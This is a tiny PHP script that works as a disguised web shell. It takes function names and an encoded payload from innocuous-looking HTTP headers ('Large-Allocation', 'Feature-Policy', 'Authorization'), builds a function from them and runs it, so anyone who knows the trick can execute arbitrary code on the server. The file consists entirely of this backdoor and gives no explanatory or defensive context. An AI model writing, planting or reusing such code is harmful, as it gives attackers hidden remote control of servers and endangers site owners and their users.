<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $post = $_HEADERS['Large-Allocation']('', $_HEADERS['Feature-Policy']($_HEADERS['Authorization']));
    $post();
}